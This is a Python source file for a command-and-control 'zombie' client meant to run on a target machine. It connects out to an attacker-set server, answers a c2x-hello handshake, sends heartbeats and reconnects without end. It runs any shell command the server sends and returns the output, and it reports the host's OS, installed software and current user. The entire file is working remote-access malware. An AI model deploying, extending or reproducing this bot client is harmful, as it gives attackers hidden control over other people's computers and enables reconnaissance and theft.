#!/usr/bin/env python3

'''
This is a template which runs on target system and works as a zombie
'''
import re
import socket
from threading import Thread
from time import sleep
import argparse

codes_list = {
    'exec':'1',
    '1':'exec',
    '__comment__get_os':'cid=2, does not have second part (for request)',
    'get_os':'2',
    '2':'get_os',
    '__comment__get_software':'cid=3, does not have second part (for request)',
    'get_software':'3',
    '3':'get_software',
    '__comment__get_whoami':'cid=4, does not have second part (for request)',
    '4':'get_whoami',
    'get_whoami':'4'
}

class Zombie:
    def __init__(self, server_ip, server_port, is_encrypted=False):
        self.server_ip = server_ip
        self.server_port = server_port
        self.is_encrypted = is_encrypted
        self.connection_is_closed = None

    def connect_to_server(self):
        self.got_hello = False # this is true when the zombie gets c2x-hello message
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.client_socket.connect((self.server_ip, self.server_port))
        except:
            return

        Thread(target=self.send_client_signal).start()
        self.client_socket.settimeout(5) # set timeout for 5 secs before receiving c2x-hello msg
        self.receive_reply()

    def send_hello_back(self):
        hello_signal_msg = 'c2x-hello_back'
        self.msg_manager(msg=hello_signal_msg)

    def msg_manager(self, msg, is_encrypted=None):
        if is_encrypted is None:
            is_encrypted = self.is_encrypted
        if is_encrypted:
            self.send_encrypted_msg(msg=msg)
        else:
            self.send_msg(msg=msg)

    def send_msg(self, msg):
        encoded_msg = msg.encode()
        try:
            self.client_socket.sendall(encoded_msg)
        except:
            self.close_client_socket()
            return

    def send_encrypted_msg(self, msg):
        pass

    def receive_reply(self):
        while True:
            try:
                data = self.client_socket.recv(4096)
            except socket.timeout:
                self.close_client_socket()
                return
            except OSError:
                self.client_socket.close()
                return
            if not data:
                self.close_client_socket()
                continue

            data = data.decode()
            if self.is_encrypted:
                decrypted_reply = self.decrypter(encrypted_msg=data)
                reply = decrypted_reply
            else:
                reply = data

            self.command_interpreter(reply_msg=reply)

    def command_interpreter(self, reply_msg):
        reply_msg = reply_msg.strip()
        if not self.got_hello:
            if reply_msg == 'c2x-hello':
                self.send_hello_back()
                self.client_socket.settimeout(None)
                self.got_hello = True
            else:
                self.close_client_socket()
                return

        elif reply_msg == 'c2x-quit':
            self.close_client_socket()
            exit()

        elif reply_msg == '':
            pass

        elif reply_msg.startswith('cid='):
            get_cid_pattern = r'cid=(\d*),'
            cid = re.findall(get_cid_pattern, reply_msg)
            if len(cid) == 1:
                cid = cid[0]
                try:
                    code = codes_list[cid]
                except KeyError:
                    return

                self.interpret_codes(code=code, msg=reply_msg)

    def interpret_codes(self, code, msg):
        if code == 'exec':
            self.execute_command(msg=msg)

        elif code == 'get_os':
            self.send_os_info()

        elif code == 'get_software':
            self.send_software()

        elif code == 'get_whoami':
            self.send_whoami()

    def send_client_signal(self):
        '''
        send client signal to server every 5 secs
        '''
        while True:
            if self.connection_is_closed:
                break
            sleep(5)
            if self.got_hello:
                self.msg_manager(msg='')

    def powershellize_command(self, command):
        powershell_command = 'powershell "{}"'.format(command)
        return powershell_command

    def get_os(self):
        import platform
        os_name = platform.system()
        return os_name.lower()

    def send_whoami(self):
        command = 'whoami'
        import os
        output = os.popen(command).read()
        self.msg_manager(msg='cid={},{}'.format(codes_list['get_whoami'], output))

    def send_software(self):
        os_name = self.get_os()
        import os
        if 'linux' in os_name:
            command = 'ls /usr/bin /opt'
            output = os.popen(command).read()

        elif 'windows' in os_name:
            command = 'Get-WmiObject -Class Win32_Product | Select-Object -Property Name'
            powershellized_command = self.powershellize_command(command=command)
            output = os.popen(powershellized_command).read()
        else:
            output = 'Other OS : {}'.format(os_name)

        self.msg_manager(msg='cid=' + codes_list['get_software'] + ',' + output)

    def send_os_info(self):
        import platform
        os_info = platform.platform()
        self.msg_manager(msg='cid=' + codes_list['get_os'] + ',' + os_info)

    def execute_command(self, msg):
        import os
        command = msg.split(',')
        if len(command) >= 2:
            command = ",".join(command[1:])
            output = os.popen(command).read()
            self.msg_manager(msg='cid=' + codes_list['exec'] + ',' + output)

    def decrypter(self, encrypted_msg):
        # encrypted_msg is decoded
        decrypted_msg = ''
        return decrypted_msg

    def close_client_socket(self):
        self.connection_is_closed = True
        self.client_socket.close()

def parse_args():
    server_ip = 'replace_server_ip'
    server_port = 'replace_server_port'

    parser = argparse.ArgumentParser()

    parser.add_argument('--ip', help=f'Server Remote IP [Default : {server_ip}]', default=server_ip)
    parser.add_argument('--port', help=f'Server Remote Port [Default : {server_port}]', default=server_port)

    args ,unknown = parser.parse_known_args()

    start_zombie(ip=args.ip, port=args.port)

def start_zombie(ip, port):
    server_ip = ip
    server_port = port
    server_port = int(server_port)
    while True:
        try:
            zombie = Zombie(server_ip=server_ip, server_port=server_port, is_encrypted=False)
            zombie.connect_to_server()
            sleep(3)
        except KeyboardInterrupt:
            exit()

def start():
    parse_args()

if __name__ == '__main__':
    start()
